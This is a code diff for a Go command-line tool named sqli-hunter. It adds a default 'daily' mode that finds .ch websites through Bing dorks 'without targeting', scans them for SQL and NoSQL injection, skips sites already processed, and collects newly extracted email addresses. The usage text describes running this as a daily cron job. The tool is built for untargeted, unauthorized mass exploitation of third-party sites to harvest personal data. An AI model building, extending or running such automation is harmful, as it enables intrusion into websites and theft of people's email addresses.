@@ -2,10 +2,10 @@ package main
 
 import (
 	"context"
+	"encoding/json"
 	"fmt"
 	"os"
 	"os/signal"
-	"encoding/json"
 	"strconv"
 	"strings"
 	"syscall"
@@ -16,13 +16,16 @@ import (
 	"github.com/sqli-hunter/sqli-hunter/internal/runner"
 )
 
-const version = "1.17.0"
+const version = "1.18.0"
 
 func main() {
 	if len(os.Args) >= 2 {
 		switch os.Args[1] {
 		case "discover":
 			runDiscover(os.Args[2:])
+			return
+		case "daily":
+			runDaily(os.Args[2:])
 			return
 		case "-h", "--help":
 			printUsage()
@@ -31,8 +34,8 @@ func main() {
 	}
 
 	if len(os.Args) < 2 {
-		printUsage()
-		os.Exit(1)
+		runDaily(nil)
+		return
 	}
 
 	args := normalizeArgs(os.Args[1:])
@@ -135,43 +138,45 @@ func applyMassDefaults(cfg *runner.Config, urlCount int, forceMass bool) {
 }
 
 type config struct {
-	targetURL      string
-	listFile       string
-	discoverDomain string
-	discoverOutput string
-	discoverPaths  string
-	discoverParams string
-	discoverSubs   bool
-	discoverNoFilter bool
-	discoverLimit  int
-	discoverSource string
-	rescan         bool
-	outputDir      string
-	method         string
-	params         map[string]string
-	data           map[string]string
-	headers        map[string]string
-	cookies        map[string]string
-	jsonBody       map[string]any
-	categories     []models.VulnCategory
-	techniques     []models.VulnType
-	customPayloads []string
-	fullScan       bool
-	includeWAF     bool
-	timeDelay      int
-	timeThreshold  float64
-	rateLimit      int
-	timeout        int
-	threads        int
-	extractThreads int
-	urlConcurrency int
-	progressEvery  int
-	massMode       bool
-	extractMeta    bool
-	verbose        bool
-	noColor        bool
-	showHelp       bool
-	showVersion    bool
+	targetURL          string
+	listFile           string
+	discoverDomain     string
+	discoverOutput     string
+	discoverPaths      string
+	discoverParams     string
+	discoverSubs       bool
+	discoverNoFilter   bool
+	discoverLimit      int
+	discoverSource     string
+	rescan             bool
+	skipScanned        bool
+	allowEmptyDiscover bool
+	outputDir          string
+	method             string
+	params             map[string]string
+	data               map[string]string
+	headers            map[string]string
+	cookies            map[string]string
+	jsonBody           map[string]any
+	categories         []models.VulnCategory
+	techniques         []models.VulnType
+	customPayloads     []string
+	fullScan           bool
+	includeWAF         bool
+	timeDelay          int
+	timeThreshold      float64
+	rateLimit          int
+	timeout            int
+	threads            int
+	extractThreads     int
+	urlConcurrency     int
+	progressEvery      int
+	massMode           bool
+	extractMeta        bool
+	verbose            bool
+	noColor            bool
+	showHelp           bool
+	showVersion        bool
 }
 
 func parseArgs(args []string) (config, error) {
@@ -484,17 +489,24 @@ func truncate(s string, n int) string {
 }
 
 func printUsage() {
-	fmt.Print(`sqli-hunter — détection SQLi/NoSQL · profil Suisse (.ch)
+	fmt.Print(`sqli-hunter — extraction emails .ch (SQLi/NoSQL)
 
 Usage:
-  sqli-hunter <domaine.ch> [options]       Découverte Bing + scan
-  sqli-hunter -D <domaine.ch> [options]
-  sqli-hunter -u <URL> [options]
-  sqli-hunter -l <fichier> [options]
-  sqli-hunter discover -d <domaine.ch> [options]
+  sqli-hunter                    Mode daily (nouveaux emails)
+  sqli-hunter daily [options]    Idem — discover + scan automatique
+  sqli-hunter ch [options]       Discover + scan manuel
+  sqli-hunter discover -d ch     Collecte URLs seulement
+  sqli-hunter -l scope.txt       Scan une liste
 
-Découverte automatique (Bing dorks → URLs vulnérables .ch, pas de sites prédéfinis) :
-  sqli-hunter ch              Cherche des URLs vuln sur tout le .ch
+Mode daily (cron quotidien) :
+  sqli-hunter daily
+  sqli-hunter daily --discover-limit 3000 --url-threads 64
+
+  → Bing dorks .ch (pas de ciblage)
+  → Skip URLs/domaines déjà traités
+  → Seulement nouveaux emails dans results/emails/
+
+Découverte manuelle :
   sqli-hunter ch --discover-limit 1000 --url-threads 64
 
 Cible:
